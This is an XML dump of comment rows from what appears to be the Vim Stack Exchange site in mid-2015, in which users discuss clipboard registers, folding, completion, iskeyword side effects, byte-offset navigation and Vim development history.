  <row Id="5361" PostId="3769" Score="0" Text="@lcd047 Why not? Other applications don't beat around the bush when I copy to clipboard (say, right-click and copy). Why Vim? Even selecting the text with a mouse and using the terminal's right-click &amp; copy works as expected." CreationDate="2015-06-30T14:33:47.707" UserId="205" />
  <row Id="5362" PostId="3769" Score="0" Text="How would I know?  I didn't write that piece of code, sorry.  I never even looked at it." CreationDate="2015-06-30T14:38:57.623" UserId="1577" />
  <row Id="5363" PostId="3769" Score="0" Text="@lcd047 Code would a bit much, but documentation saying you can't would answer this question." CreationDate="2015-06-30T14:39:50.920" UserId="205" />
  <row Id="5364" PostId="3769" Score="0" Text="Don't have any official reference either, sorry." CreationDate="2015-06-30T14:46:00.853" UserId="1577" />
  <row Id="5367" PostId="3770" Score="0" Text="Then I must hunt for something else causing this. Or something's messed with my `primary` and `clipboard`." CreationDate="2015-06-30T14:52:36.697" UserId="205" />
  <row Id="5368" PostId="3770" Score="0" Text="Are you sure you aren't causing another application to assert ownership of those in the interim?  Are you sure the application you want to paste into will look at the cut buffers if nothing is asserting ownership of one of the selections?" CreationDate="2015-06-30T14:55:38.523" UserId="15" />
  <row Id="5369" PostId="3770" Score="0" Text="I doubt the former (been careful not to select any text), but about the latter, not at all sure." CreationDate="2015-06-30T14:56:32.537" UserId="205" />
  <row Id="5370" PostId="3763" Score="1" Text="I knew I was forgetting something! We're *within* Vim, so we don't need the PID. `/proc/self/exe`!" CreationDate="2015-06-30T17:05:14.580" UserId="205" />
  <row Id="5371" PostId="3762" Score="0" Text="&quot;We need to use readlink because...&quot; On POSIX systems, file won't say &quot;Symbolic link&quot; unless `-h` is specified. For GNU file, use `file -L [filename]`." CreationDate="2015-06-30T17:48:49.673" UserId="880" />
  <row Id="5372" PostId="3761" Score="0" Text="In this case since you're on a 64-bit system and the gcc options don't include `-m32`, it's 64-bit. It's safe to assume that any package that came with your system is 64-bit, except for a very few rare apps that are only available in 32-bit form. The situation isn't the same as Windows where very many apps are still 32-bit." CreationDate="2015-06-30T19:26:00.517" UserId="2658" />
  <row Id="5373" PostId="3773" Score="5" Text="Is it possible? Absolutely! Case and point: [textobj-word-column.vim](https://github.com/coderifous/textobj-word-column.vim)" CreationDate="2015-06-30T19:46:06.937" UserId="778" />
  <row Id="5374" PostId="3773" Score="0" Text="@PeterRincker This is nice, but I wonder if it couldn't be simplified to take advantage of Kana's [textobj-user](https://github.com/kana/vim-textobj-user/wiki)." CreationDate="2015-06-30T23:01:36.073" UserId="1577" />
  <row Id="5375" PostId="3775" Score="1" Text="Look at the files in `$VIMRUNTIME/indent`.  They work by setting `indentexpr`.  Create a file for Handlebars that, err, handles the patterns you want, and return `HtmlIndent()` for everything else." CreationDate="2015-06-30T23:10:36.793" UserId="1577" />
  <row Id="5376" PostId="3774" Score="0" Text="`:E` is no less convenient than `&lt;C-o&gt;`. But `:E` is easier to remember since I can group it together with `:e`, `:sp.`, `:vs.` etc." CreationDate="2015-07-01T00:08:44.113" UserId="1080" />
  <row Id="5377" PostId="3769" Score="0" Text="What about shift+insert ? did you try?" CreationDate="2015-07-01T00:30:30.457" UserId="2663" />
  <row Id="5378" PostId="3762" Score="0" Text="@Random832 Thanks! Yes, you're right, the manpage says `-L ... is the default if the environment variable POSIXLY_CORRECT is defined.`" CreationDate="2015-07-01T01:49:10.550" UserId="205" />
  <row Id="5379" PostId="3773" Score="0" Text="Thanks, Peter, that's exactly the sort of example I was looking for." CreationDate="2015-07-01T03:00:50.343" UserId="2657" />
  <row Id="5380" PostId="3767" Score="0" Text="Yep, the one already existing is much older than the one available on Dr. Chip's site. I forgot exact version, but IIRC the &quot;Last Change&quot; was in 2013 or something." CreationDate="2015-07-01T04:47:43.747" UserId="2647" />
  <row Id="5381" PostId="3773" Score="2" Text="@PeterRincker make this an answer :)" CreationDate="2015-07-01T11:02:08.847" UserId="599" />
  <row Id="5382" PostId="3780" Score="0" Text="I'm not sure that would be a good solution but according to `:help arabic` it is possible to write text right aligned when the option `+arabic` is enabled, maybe you could search for something this way... (Also I tend to think that if your purpose is just commenting code, you might not need a right-aligned presentation and write it in a regular way but thats only my opinion ;-) )" CreationDate="2015-07-01T15:17:01.520" UserId="1841" />
  <row Id="5383" PostId="3780" Score="0" Text="@statox `set rightleft` does that, but that also means that everything is reversed; so  `Hello, world` becomes `dlrow ,olleH` ;-)" CreationDate="2015-07-01T17:20:38.667" UserId="51" />
  <row Id="5384" PostId="3775" Score="0" Text="thanks @lcd047. That put me on the right track to get started hacking the vim-html5 plugin." CreationDate="2015-07-01T17:44:04.340" UserId="446" />
  <row Id="5385" PostId="3780" Score="0" Text="@Carpetsmoker: Oh I didn't know that but that makes sense... Actually that's why I made it a comment and not an answer because that was just a thought and I never used it :-)" CreationDate="2015-07-01T18:29:34.307" UserId="1841" />
  <row Id="5386" PostId="3782" Score="2" Text="Are you aware of the [`'confirm'`](http://vimhelp.appspot.com/options.txt.html#'confirm') option?I think that does pretty much what your funtion does?" CreationDate="2015-07-01T23:16:15.317" UserId="51" />
  <row Id="5387" PostId="3731" Score="0" Text="Quick update: I ran into an issue where this line ran every time I sourced my `.vimrc` file. If I sourced `.vimrc` more than once per session (_e.g.,_ when tinkering with `.vimrc` and trying to test the results), `viminfo`'s location would be set to `C:\Users\Ryan\vimfiles\viminfo,nC:\Users\Ryan\vimfiles\viminfo`. To resolve this, I wrapped this line in the following if statement: `if &amp;viminfo !~ ',n'` (which returns 0 if viminfo matches the string ',n')." CreationDate="2015-07-02T02:50:51.610" UserId="2593" />
  <row Id="5388" PostId="3782" Score="0" Text="@Carpetsmoker♦ I am aware of it, still I want to do it like this, because pressing F2 again is much simpler than pressing anything else. Using vimscript is about simplifying your life, isn't it? :-)" CreationDate="2015-07-02T09:14:05.047" UserId="2620" />
  <row Id="5389" PostId="3785" Score="0" Text="With *&quot;replaces any existing data&quot;* I assume you mean *&quot;Replaces all the existing tabs*? See: [How can I open multiple tabs at once?](http://vi.stackexchange.com/q/2108/51) for an explanation on why this happens, and a way to fix it." CreationDate="2015-07-02T11:38:54.333" UserId="51" />
  <row Id="5390" PostId="3785" Score="0" Text="Yeah that's right, any existing tab/tabs/buffers disappears running the above. I saw that for loop of yours earlier but was hoping it can be accomplished without writing a function. Perhaps that's not possible." CreationDate="2015-07-02T11:54:26.350" UserId="2676" />
  <row Id="5391" PostId="3785" Score="0" Text="You can put the code in a single line, if you want... `for f in glob(..) | execute ... | setlocal readonly | endfor` ... I don't see the problems with creating a function, though, as it's more readable." CreationDate="2015-07-02T12:05:50.960" UserId="51" />
  <row Id="5392" PostId="3785" Score="0" Text="Thanks, I ended up using the entire function for readability. It's not too much code after all!" CreationDate="2015-07-02T12:08:36.627" UserId="2676" />
  <row Id="5393" PostId="3788" Score="0" Text="[Here is an expanded version](https://gist.github.com/Carpetsmoker/1d9eda4d66daed954176) of the function which allows you to pass an expression; use it like: `:call OpenMultipleTabs(['/var/log/*'], 'setlocal readonly')` ..." CreationDate="2015-07-02T12:22:15.940" UserId="51" />
  <row Id="5395" PostId="3790" Score="0" Text="It looks like this plugin overrides `a&quot;`, and uses `A&quot;` for the original behaviour?" CreationDate="2015-07-02T12:53:28.443" UserId="51" />
  <row Id="5396" PostId="3790" Score="0" Text="... while, I believe, also allowing seeking &quot;to the left&quot;" CreationDate="2015-07-02T12:56:03.253" UserId="1800" />
  <row Id="5397" PostId="3788" Score="0" Text="That last one did not work for me. They are opened in tabs but readonly is not set." CreationDate="2015-07-02T13:51:03.760" UserId="2676" />
  <row Id="5398" PostId="3792" Score="2" Text="Your problem is `:global` operates on entire lines only, and not the matching part. So you're running `~` for every line (which should convert the first character, `f`, to `F`). No time to write a more expanded answer right now, but at least you know your problem ;-)" CreationDate="2015-07-02T17:54:05.360" UserId="51" />
  <row Id="5399" PostId="3793" Score="0" Text="Yes, but I would like to perform an arbitrary command at every match." CreationDate="2015-07-02T18:02:04.513" UserId="2678" />
  <row Id="5400" PostId="3793" Score="1" Text="The simplest would be to perform a search `\v&lt;[whnm]&gt;`, press `~` (or whatever command), and then it is just a matter of hitting `n.` repeatedly (and that could be automated)." CreationDate="2015-07-02T18:10:31.510" UserId="1800" />
  <row Id="5401" PostId="3793" Score="1" Text="Forgo the capture group as we can use `\0`/`&amp;`. e.g. `:'a,'bs/\&lt;[whnm]\&gt;/\U&amp;/g`." CreationDate="2015-07-02T18:12:51.423" UserId="778" />
  <row Id="5402" PostId="3793" Score="0" Text="@Peter Rincker - Yes, that's even nicer!" CreationDate="2015-07-02T18:16:30.817" UserId="1800" />
  <row Id="5403" PostId="3792" Score="0" Text="To me, it seems like vim's problem instead of my problem.  I've been using vim exclusively for a couple of years, and have recently begun to try to step up my vim sophistication level.  I keep bumping into this butterfly every once in a while, and I'd like to kill it and pin it to the page." CreationDate="2015-07-02T19:38:59.940" UserId="2678" />
  <row Id="5404" PostId="3655" Score="0" Text="@romainl, I have done as you requested. I hope it helps." CreationDate="2015-07-02T19:58:32.130" UserId="2511" />
  <row Id="5405" PostId="3655" Score="0" Text="@lcd047, your suggestion does indeed produce the proper behavior, but why isn't my function working without it?" CreationDate="2015-07-02T20:00:54.920" UserId="2511" />
  <row Id="5406" PostId="3676" Score="0" Text="Thanks for the info on `search()`. However, setting @/ is what I actually wanted to do by using `normal` instead." CreationDate="2015-07-02T20:04:52.110" UserId="2511" />
  <row Id="5407" PostId="3657" Score="0" Text="Forcing its storage by setting `@/` worked. Thanks! However, what do you mean `/` resets after the function completes? The search in question shows up when I hit `/` followed by the up arrow when back in normal mode after running my function, so doesn't that mean it didn't reset?" CreationDate="2015-07-02T20:10:38.863" UserId="2511" />
  <row Id="5408" PostId="3325" Score="0" Text="what does `!exists(&quot;s:std_in&quot;)` mean?" CreationDate="2015-07-02T20:50:30.753" UserId="2681" />
  <row Id="5409" PostId="3800" Score="0" Text="Using visual selector with ! also does not work because it replaces the whole line and doesn't just insert on a single character." CreationDate="2015-07-02T21:43:11.353" UserId="1417" />
  <row Id="5410" PostId="3799" Score="0" Text="Thanks for the in-depth explanation, that clears up a lot of my confusions. By the way, I discovered Apprentice while browsing for color schemes a few weeks ago, and its one of my favorites!" CreationDate="2015-07-02T21:46:55.710" UserId="2061" />
  <row Id="5411" PostId="3801" Score="0" Text="I got it working using C-f Thanks a ton! `inoremap &lt;expr&gt; &lt;C-f&gt; strftime('%y-%m-%d %H:%M:%S')`" CreationDate="2015-07-02T22:08:33.987" UserId="1417" />
  <row Id="5412" PostId="3799" Score="2" Text="Note that you can write your colorscheme in such a way to use RGB colors when available (gVim, xterm customized palette), but fall back to the standard xterm colours if that's not available. [Solarized does this](https://github.com/altercation/vim-colors-solarized/blob/master/colors/solarized.vim#L243) for example. You can eat your cake and have it too!" CreationDate="2015-07-03T00:19:36.700" UserId="51" />
  <row Id="5414" PostId="3803" Score="0" Text="This solved the issue. Thank you!" CreationDate="2015-07-03T01:49:10.987" UserId="2479" />
  <row Id="5415" PostId="3807" Score="3" Text="... And that's because the characters above and below the highlighted ones in the wrapped lines correspond to other columns.  Doing it any other way would be misleading." CreationDate="2015-07-03T05:55:14.720" UserId="2313" />
  <row Id="5416" PostId="3655" Score="0" Text="Your function doesn't work because `n` and `N` use the `/` register, and `search()` doesn't update the `/` register." CreationDate="2015-07-03T07:34:01.713" UserId="1577" />
  <row Id="5417" PostId="2046" Score="0" Text="Just for reference I found lldb plugin @ https://github.com/gilligan/vim-lldb/ and screenshots look promising." CreationDate="2015-07-03T07:43:00.640" UserId="784" />
  <row Id="5418" PostId="3676" Score="0" Text="@Gantron Right; updated the answer." CreationDate="2015-07-03T09:19:02.383" UserId="51" />
  <row Id="5419" PostId="3811" Score="5" Text="Note that modifying `iskeyword` has a lot of side-effects. For example `dw` on `some-text` will now delete `some-text`, instead of only `some`. Not necessarily a bad thing, but something to be aware of." CreationDate="2015-07-03T09:59:44.923" UserId="51" />
  <row Id="5420" PostId="3813" Score="2" Text="In your mappings, why not use `:tabmove -1` and `:tabmove +1`?" CreationDate="2015-07-03T13:27:19.373" UserId="64" />
  <row Id="5421" PostId="3813" Score="0" Text="@tommcdo: Well... I made those mappings several months ago and I have no idea of what was in my mind at this moment. And I didn't event gave a thought about it when I copied it in my answer. Anyway you're totally right I'll edit my answer to make is simpler thanks for the heading :-)" CreationDate="2015-07-03T13:33:49.710" UserId="1841" />
  <row Id="5422" PostId="3816" Score="0" Text="I personally don't use folding, and you shuld not need to. Just organise your vimrc and it should all be good." CreationDate="2015-07-03T13:48:03.880" UserId="2689" />
  <row Id="5423" PostId="3816" Score="0" Text="My vimrc is already organized in section (general options, plugins, mappings, navigation, color, etc...). The fact to be able to fold a section (or subsection) is actually good to focus on what you're editing/ looking for." CreationDate="2015-07-03T13:51:50.053" UserId="1841" />
  <row Id="5424" PostId="3817" Score="0" Text="I forgot to precise that in my question: I'm not a a fan of &quot;separating&quot; the `vimrc` in different files because (IMO) it increase the complexity and make it more difficult to maintain. About the folding what do you mean by &quot;off to the right side with spacing&quot;?" CreationDate="2015-07-03T13:54:30.150" UserId="1841" />
  <row Id="5425" PostId="3814" Score="0" Text="[My vimrc](https://github.com/romainl/dotvim/blob/master/vimrc) is a little less than 400 lines long without being messy and without folds." CreationDate="2015-07-03T14:13:30.290" UserId="54" />
  <row Id="5426" PostId="3816" Score="0" Text="Okay. Sorry for bad answer." CreationDate="2015-07-03T14:18:03.197" UserId="2689" />
  <row Id="5427" PostId="3816" Score="0" Text="That's not a bad answer and I'm also guilty for not giving detailled enough question, no need to be sorry ;-)" CreationDate="2015-07-03T14:26:19.180" UserId="1841" />
  <row Id="5428" PostId="3818" Score="0" Text="So you go with `marker`. Indeed customizing `foldcolumn` is a nice thing to do, I'll see which value fits best on my need. Also I share your view on the split files but I didn't know `CtrlSF` I'll take a look at it even if I'm pretty happy with `CtrlP`." CreationDate="2015-07-03T14:30:44.203" UserId="1841" />
  <row Id="5429" PostId="3818" Score="0" Text="Also could you explain how to use the custom folding method please? I tried to set `fdm` to `foldtext` and `MyFoldText()` but it seems like it's not the right way to use it." CreationDate="2015-07-03T14:39:58.313" UserId="1841" />
  <row Id="5430" PostId="3818" Score="0" Text="@statox `CtrlSF` works best with [ag](https://github.com/ggreer/the_silver_searcher) or [ack](http://beyondgrep.com/), which are essentially specialized versions of `grep`.  `foldtext` is not a custom folding method, but a function to change the way folded text looks.  The last line in my snippet shows how it's used: `set foldtext=MyFoldText()`." CreationDate="2015-07-03T14:54:38.097" UserId="1577" />
  <row Id="5431" PostId="3818" Score="0" Text="Thanks I made it work and I like how it looks!" CreationDate="2015-07-03T15:10:53.213" UserId="1841" />
  <row Id="5432" PostId="3819" Score="1" Text="I haven't tried this plugin, but the name suggests it hooks into Vim's omnicompletion. You can trigger this with `&lt;C-x&gt;&lt;C-o&gt;` (that's control+x followed by control+o). Does that work?" CreationDate="2015-07-03T15:23:56.487" UserId="51" />
  <row Id="5433" PostId="3815" Score="3" Text="Note that mapping Ctrl+h in a terminal doesn't always work, as this is often the backspace key. See [this answer](https://vi.stackexchange.com/questions/3225/disable-esc-but-keep-c/3570#3570) and [this question](http://vi.stackexchange.com/q/3119/51)." CreationDate="2015-07-03T15:29:16.460" UserId="51" />
  <row Id="5434" PostId="3817" Score="0" Text="I mean `&quot;                                    {{{` with as many spaces in there as your `textwidth` so the markers are near the right edges. I do also have a personalized FoldText function in folding.vim file. I prefer separate files so that my git repo only one specific type of mod per commit." CreationDate="2015-07-03T15:39:57.603" UserId="2303" />
  <row Id="5435" PostId="3820" Score="0" Text="I can't test it right now but that seems to be an ideal solution to me! Thanks for sharing!" CreationDate="2015-07-03T17:15:25.717" UserId="1841" />
  <row Id="5436" PostId="3822" Score="0" Text="Just using `:let @+ .= 'XXX'` seems to work?" CreationDate="2015-07-04T06:56:37.423" UserId="51" />
  <row Id="5437" PostId="3822" Score="3" Text="@Carpetsmoker Yes and no.  There has been a recent discussion about it on vim_dev and apparently you aren't supposed to do that, even though it may appear to work under some conditions.  I presume it has to do with the register contents having a type (character / line / block), and string concatenation not doing the necessary bookkeeping.  It doesn't make any difference anyway, it still isn't a normal mode command." CreationDate="2015-07-04T07:02:17.847" UserId="1577" />
  <row Id="5438" PostId="3794" Score="0" Text="Cannot reproduce with a simple `[lots of spaces] import assert [newline and a lot of spaces] assert.` (then completion starts). That was tested with the Konsole terminal emulator on KDE (Arch Linux), vim 7.4.738, jedi-vim 0.7.0-154-gbce599f." CreationDate="2015-07-04T09:08:57.983" UserId="2698" />
  <row Id="5439" PostId="3655" Score="0" Text="`search()` is used elsewhere, but the search for which I want to use `n` and `N` is `normal /\[This option is yet to be written.\]`." CreationDate="2015-07-04T18:34:46.543" UserId="2511" />
  <row Id="5440" PostId="3676" Score="0" Text="Good to know. However, if vim works this way, why does the search wind up in the search history?" CreationDate="2015-07-04T18:40:22.657" UserId="2511" />
  <row Id="5441" PostId="3823" Score="0" Text="Would I put that let in my .vimrc file?" CreationDate="2015-07-04T21:24:20.003" UserId="2695" />
  <row Id="5442" PostId="3824" Score="3" Text="You can not &quot;set clipboard register to a different name&quot;. You are asking for some custom functionality written for you, that does something like this: when you append to a named register (e.g. using `Z`, i.e. append to `z`), to automatically *also* append to the clipboard register (`+`) - a kind of sync between a named register and `+` register. You had your answer here: http://vi.stackexchange.com/a/3823/1800, but based on your reply, you seem to want to make Vim bend to you without learning it first." CreationDate="2015-07-04T22:52:54.333" UserId="1800" />
  <row Id="5443" PostId="3325" Score="0" Text="I would imagine it pairs with argc==0 to check that a plain invocation of `vim` has been called. Then it opens NERDTree" CreationDate="2015-07-04T23:53:54.927" UserId="2143" />
  <row Id="5444" PostId="3823" Score="1" Text="Please note that `let @+ = @A` discards the type of register `a`.  The correct way to copy registers is something like this: `call setreg('+', getreg('a', 1, 1), getregtype('a'))`." CreationDate="2015-07-05T06:51:21.190" UserId="2313" />
  <row Id="5445" PostId="3811" Score="0" Text="Mhh this only seems to work inside of a CSS file, as soon as I switch to a different buffer (for example a HTML file) it only completes words with out the minus sign." CreationDate="2015-07-05T07:10:53.087" UserId="350" />
  <row Id="5446" PostId="3811" Score="0" Text="@RaphaelAhrens, see my edit." CreationDate="2015-07-05T07:51:27.560" UserId="54" />
  <row Id="5447" PostId="3811" Score="0" Text="@romainl I really appreciate your fast answer. But I'm sorry, I can't accept this answer since it will not scale with more file types and in addition it has the side-effects mentioned by Carpetsmoker. I hope you understand." CreationDate="2015-07-05T11:34:09.717" UserId="350" />
  <row Id="5448" PostId="3809" Score="0" Text="You say &quot;autocomplete&quot;, does this mean you are using YouCompleteMe, neocomplete, or something similar? If so, this should be mentioned in your question. If not, then you must be issuing some kind of completion command, such as `&lt;c-x&gt;&lt;c-n&gt;`, which should also be specified in your question." CreationDate="2015-07-05T13:47:37.027" UserId="21" />
  <row Id="5449" PostId="3830" Score="0" Text="Can you give an example? This sounds like [the meta tags in Javadoc](http://download.java.net/jdk7u2/docs/technotes/tools/solaris/javadoc.html#javadoctags)." CreationDate="2015-07-05T13:58:46.840" UserId="205" />
  <row Id="5450" PostId="3831" Score="1" Text="Can't you just run `:!./find_structs %`?" CreationDate="2015-07-05T14:17:02.643" UserId="205" />
  <row Id="5451" PostId="3831" Score="0" Text="Yes, but i want it to be inside vim so that i can run other operations like jump to struct definition using ctags." CreationDate="2015-07-05T14:21:53.167" UserId="2706" />
  <row Id="5452" PostId="3831" Score="2" Text="A plugin like this one might be more convenient: http://majutsushi.github.io/tagbar/" CreationDate="2015-07-05T14:27:06.047" UserId="205" />
  <row Id="5453" PostId="3809" Score="0" Text="@KarlYngveLervåg thank you for your comment. Please take a look at my edit." CreationDate="2015-07-05T15:15:26.980" UserId="350" />
  <row Id="5454" PostId="510" Score="0" Text="Consider switching to Neovim. It now has a built in terminal emulator which works quite well and can be open in a vim buffer." CreationDate="2015-07-05T15:49:24.697" UserId="1165" />
  <row Id="5455" PostId="3829" Score="0" Text="That is what I was looking for, a thorough explanation. Which you provided perfectly. Unfortunately when I see let and @ I hadn't known what they do but it just dawned on me when reading your response, thanks!" CreationDate="2015-07-05T16:32:21.310" UserId="2695" />
  <row Id="5456" PostId="3832" Score="0" Text="I can't see that such a function would make sense in an editor - but that, of course, doesn't mean there couldn't be a sensible application; and I'm certainly keen to know if there's any and why you are specifically asking for one. - Just one point: &quot;a rand() function **won't hurt**&quot; is just about the worst argument to introduce one." CreationDate="2015-07-05T17:56:08.997" UserId="2479" />
  <row Id="5457" PostId="3809" Score="1" Text="Your edit confirmed my suspicion. First, IMHO autocompletion should be automatic, and as such the problem you are describing is not with autocompletion, but merely with completion. For autocompletion in Vim I recommend you look at neocomplete or YouCompleteMe. Second, You are using Vim's generic KEYWORD completion. A keyword is defined by the option `'iskeyword'`, and even though keywords are used also for other commands (side effects), this is still the correct way to achieve what you want without using other kinds of (auto)completion." CreationDate="2015-07-05T18:02:49.010" UserId="21" />
  <row Id="5458" PostId="3809" Score="0" Text="@KarlYngveLervåg First I'm sorry for the misunderstanding. But I thought that autocompletion was the right term. Second could you then point me to something that solves my completion problem? As far as I can see YouCompleteMe and neocomplete don't change the completing behavior of the standard completion, they only add more &quot;auto&quot;, which I don't need. I really thought this would be possible with Vim." CreationDate="2015-07-05T19:02:39.947" UserId="350" />
  <row Id="5459" PostId="3832" Score="0" Text="@Janis: I agree that it is not necessarily a core feature of an editor. I'm using it to shuffle the letters of a string (really that's just to learn vimscript I will not say that this plugin will change the world). So I'm not specifically asking for it I was simply genuinely wondering why it isn't implemented. Your last point is totally fair that's not how a feature should be added in a software I can only agree with you :-)" CreationDate="2015-07-05T19:48:42.880" UserId="1841" />
  <row Id="5460" PostId="3834" Score="0" Text="Err, five years is a rather conservative estimate. :) Meanwhile, @christian-brabandt has gathered some of these patches in a [repository](https://github.com/chrisbra/vim-mq-patches).  There is a [rand_funtion](https://github.com/chrisbra/vim-mq-patches/blob/master/rand_function) among them." CreationDate="2015-07-05T19:55:53.990" UserId="2313" />
  <row Id="5461" PostId="3834" Score="0" Text="Wow 5 years in a TODO list... let's hope that a mature version of Neovim will solve this kind of things. Also does it mean that the maintainers would be ok to include the patch in vim but don't have the time to do so or that they just don't want the patch to be included (I'm not really aware of the way new features are included into vim). And finally interesting point, I didn't know the history of the vimscript (or VimL) name!" CreationDate="2015-07-05T19:56:20.167" UserId="1841" />
  <row Id="5462" PostId="3834" Score="0" Text="@statox Neovim did solve the problem of patches sitting in a queue for years.  Its the &quot;getting mature&quot; part that some people are skeptic about." CreationDate="2015-07-05T19:59:00.027" UserId="2313" />
  <row Id="5463" PostId="3833" Score="0" Text="Indeed the seems to follow the unix philosophy. By the way, the function you give in your answer works pretty good and it isn't listed in the answers of the [question](http://vi.stackexchange.com/questions/807/how-to-generate-random-numbers/) I'm referring to in my question, maybe you should add an answer that could be useful to other users :-)" CreationDate="2015-07-05T20:01:52.887" UserId="1841" />
  <row Id="5464" PostId="3834" Score="0" Text="@SatoKatsura: About the patch I had understood that they wanted to make the code more maintainable and easier to patch by a greater number of people, that's why I mentioned that. On the &quot;getting mature&quot; part I have to say that I haven't studied the project enough to have a real opinion about it." CreationDate="2015-07-05T20:04:43.340" UserId="1841" />
  <row Id="5465" PostId="3839" Score="2" Text="Well, let's change it then! ... grimscript? :P" CreationDate="2015-07-05T22:27:34.653" UserId="1800" />
  <row Id="5466" PostId="3731" Score="0" Text="Or, you can avoid re-reading the value by setting a global variable and checking that it exists (the same as plugins check to see if they're already loaded or not). E.g. https://github.com/mhinz/vim-randomtag/blob/master/autoload/randomtag.vim#L7, resp. https://github.com/mhinz/vim-randomtag/blob/master/autoload/randomtag.vim#L60" CreationDate="2015-07-05T22:30:20.247" UserId="1800" />
  <row Id="5467" PostId="3833" Score="0" Text="ok, i added the answer." CreationDate="2015-07-05T22:37:46.290" UserId="1800" />
  <row Id="5468" PostId="3833" Score="0" Text="And I upvoted it. Thanks!" CreationDate="2015-07-05T22:39:37.203" UserId="1841" />
  <row Id="5469" PostId="3834" Score="1" Text="To be fair, bug fixes are merged a lot faster, usually within a few days.  The vast majority of patches accepted for 7.3 and 7.4 (~2000 patches) have been bug fixes." CreationDate="2015-07-06T03:39:35.997" UserId="1577" />
  <row Id="5470" PostId="3839" Score="0" Text="Curious: has Bram Moolenar (did I spell that right?) ever discussed this in the mailing lists?" CreationDate="2015-07-06T05:15:05.400" UserId="205" />
  <row Id="5471" PostId="3841" Score="0" Text="Selecting a suggestion *always* leaves you in insert mode. Insert mode completion would be useless if it left you in normal mode after completion." CreationDate="2015-07-06T06:56:58.350" UserId="54" />
  <row Id="5472" PostId="3841" Score="0" Text="In the title and first paragraph you say you want to go to normal mode, but at the end of the first paragraph and in the last paragraph you say you want to go to insert mode. Which is it? O.o" CreationDate="2015-07-06T07:53:46.823" UserId="205" />
  <row Id="5473" PostId="3726" Score="0" Text="@Carpetsmoker [Neovim Issue opened](https://github.com/neovim/neovim/issues/2965)." CreationDate="2015-07-06T07:59:13.267" UserId="267" />
  <row Id="5474" PostId="3838" Score="0" Text="The question belongs here just fine, but I think others have got the sense that you're not willing to work with Vim. I have asked similar questions (http://vi.stackexchange.com/q/258/205, http://vi.stackexchange.com/q/2009/205), and got nice answers." CreationDate="2015-07-06T08:17:38.177" UserId="205" />
  <row Id="5475" PostId="3838" Score="0" Text="Notes: use `cd -` so that your working directory is restored. `cd` without any arguments will take you back to the home directory, `cd -` will take you back to wherever you were." CreationDate="2015-07-06T08:18:47.700" UserId="205" />
  <row Id="5476" PostId="3838" Score="0" Text="Also consider using `vim &quot;$@&quot;` so that you can pass additional arguments or commands to Vim." CreationDate="2015-07-06T08:19:25.803" UserId="205" />
  <row Id="5477" PostId="3842" Score="0" Text="Considering that two other files in the documentation use VimL without explanation, does either paragraph have any substance worth being in an answer?" CreationDate="2015-07-06T09:28:38.867" UserId="205" />
  <row Id="5478" PostId="3831" Score="0" Text="@muru: i would prefer a custom vim script than depending on an external plugin especially when you are running vim in an embedded environment." CreationDate="2015-07-06T09:46:27.463" UserId="2706" />
  <row Id="5479" PostId="3842" Score="0" Text="Thus they says both are valid names for vim scripting language. Either way, _VimScript_ has never been an official name for what we are speaking about." CreationDate="2015-07-06T10:25:33.027" UserId="626" />
  <row Id="5480" PostId="3841" Score="0" Text="I'm sorry I mistyped. I just want a way to autocomplete my word and then go into normal mode immediately after." CreationDate="2015-07-06T11:05:45.053" UserId="2655" />
  <row Id="5481" PostId="3781" Score="0" Text="I've tried this but `TextChangedI` doesn't seem to be firing.  I put the code in `~/vimfiles/plugin/pushleft.vim` and `~/vimfiles/vimrc`.  I started with `vim -u NONE` and manually sourced those two.  `:TogglePush` does print the enabled/disabled message, but text entry is normal even when push is enabled.  When I `set verbose=9`, I see `CursorMovedI` as text is entered.  When I hit Esc, I see `TextChanged`, but I never see `TextChangedI`.  Any thoughts?  Vim is `VIM - Vi IMproved 7.4 (2013 Aug 10, compiled Aug 10 2013 14:33:40)`.  Thanks!" CreationDate="2015-07-06T12:51:59.400" UserId="1430" />
  <row Id="5482" PostId="3819" Score="0" Text="Why wasn't omnisharp-vim installed through Vundle, as you did for the remaining plugins?" CreationDate="2015-07-06T13:05:21.410" UserId="599" />
  <row Id="5483" PostId="3845" Score="0" Text="If everything is on one line, you can use `Xl` (where `X` is the number of characters) or the number of characters followed by Right arrow." CreationDate="2015-07-06T13:35:36.963" UserId="2698" />
  <row Id="5484" PostId="3844" Score="0" Text="Ctrl Y is what I was looking for, thank you!" CreationDate="2015-07-06T13:37:25.017" UserId="2655" />
  <row Id="5485" PostId="3846" Score="0" Text="Thanks for the answer. I'm really looking for moving forward X bytes, not chars though. Could you explain what your search pattern does, possibly with references to documentation?" CreationDate="2015-07-06T14:31:50.923" UserId="2720" />
  <row Id="5486" PostId="3846" Score="0" Text="Done. It is also possible to automate the `[count]go` process though in a vim function (read current byte offset, add desired number, `go` there)." CreationDate="2015-07-06T15:02:07.280" UserId="1800" />
  <row Id="5487" PostId="3830" Score="1" Text="In [`:help write-plugin`](http://vimhelp.appspot.com/usr_41.txt.html#write%2dplugin) some things are mentioned. The `@tag` notation is just done by some people who are used to it from other environments." CreationDate="2015-07-06T15:30:02.780" UserId="51" />
  <row Id="5489" PostId="3850" Score="0" Text="One question, does `col('.')` actually return the byte offset in the line?  Last I looked, it just showed the cursor column." CreationDate="2015-07-06T16:12:19.927" UserId="865" />
  <row Id="5490" PostId="3850" Score="0" Text="@EvergreenTree According to `:help col()`: _[t]he result is a Number, which is the byte index of the column position given with {expr}_.  I take it that's the 1-based byte offset..." CreationDate="2015-07-06T16:14:53.583" UserId="1577" />
  <row Id="5491" PostId="3850" Score="0" Text="Will the answer work in a file having this line only: `abcäb` ? (I haven't checked)" CreationDate="2015-07-06T16:14:53.767" UserId="1800" />
  <row Id="5492" PostId="3850" Score="1" Text="@VanLaser It works in my quick tests.  You tell us if it still works after extended testing." CreationDate="2015-07-06T16:16:26.743" UserId="1577" />
  <row Id="5493" PostId="3850" Score="0" Text="Just tested and it works :)" CreationDate="2015-07-06T16:17:58.547" UserId="1800" />
  <row Id="5494" PostId="3846" Score="0" Text="... added automated function and command." CreationDate="2015-07-06T16:57:41.173" UserId="1800" />
  <row Id="5495" PostId="3846" Score="0" Text="Thanks for the update, this starts to look good! There are two small differences between `[count]go` and your method: 1) `[count]go` adds an item to the jump list, so I can use `Ctrl+O` to quickly jump back to my previous position. 2) `[count]go` can be used without `:`, is it possible to introduce a new `[count]GO` that does your thing. Could you edit your answer to also match that behavior of `go`?" CreationDate="2015-07-06T17:08:18.037" UserId="2720" />
  <row Id="5496" PostId="3846" Score="0" Text="edited for both points" CreationDate="2015-07-06T17:19:26.767" UserId="1800" />
